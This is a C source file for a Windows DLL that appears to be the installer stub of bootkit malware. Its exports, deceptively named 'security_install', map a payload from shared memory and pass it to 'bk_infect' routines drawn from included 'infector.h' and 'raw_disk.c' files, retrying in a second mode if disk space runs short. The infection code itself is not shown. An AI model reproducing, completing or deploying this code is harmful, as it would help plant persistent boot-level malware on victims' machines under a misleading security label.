#define _WIN32_WINNT 0x0501
#define WIN32_LEAN_AND_MEAN 1
#include <Windows.h>
#include <WinIoCtl.h>

#include "..\..\..\..\shared_code\platform.h"
#include "..\..\..\..\shared_code\types.h"
#include "..\..\..\..\shared_code\native.h"
#include "..\..\code\errors.h"

#ifdef _WIN64
#include "..\..\code\dll_mem_x64.c"
const uint32_t mlscsz = sizeof(mlsc64);
#else
#include "..\..\code\dll_mem_x32.c"
const uint32_t mlscsz = sizeof(mlsc32);
#endif // _WIN64

#include "raw_disk.c"

#include "infector.h"

uint8_t* gPayload;

int DllMain(HINSTANCE hInstance, uint32_t dwReason, pvoid_t pReserved)
{
    return 1;
}

int security_install_by_ptr(uint8_t** ppPayload)
{
    int err;

    gPayload = *ppPayload;

    if ((err = bk_infect(1)) == ERROR_BK_NO_SPACE) {
        err = bk_infect(0);
    }

    return err;
}

int security_install(char* sharedName)
{
    int ret = ERROR_NO_MEMORY;
    HANDLE hMem;
    uint8_t* pBuffer;

    hMem = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, sharedName + sizeof(uint32_t));

    if (hMem == NULL) {
        return ret;
    }

    pBuffer = MapViewOfFile(hMem, FILE_MAP_ALL_ACCESS, 0, 0, *(uint32_t*)sharedName);

    if (pBuffer == NULL) {
        return ret;
    }

    ret = security_install_by_ptr(&pBuffer);

    __movsb(pBuffer, sharedName + sizeof(uint32_t), 8);

    UnmapViewOfFile(pBuffer);
    CloseHandle(hMem);

    return ret;
}
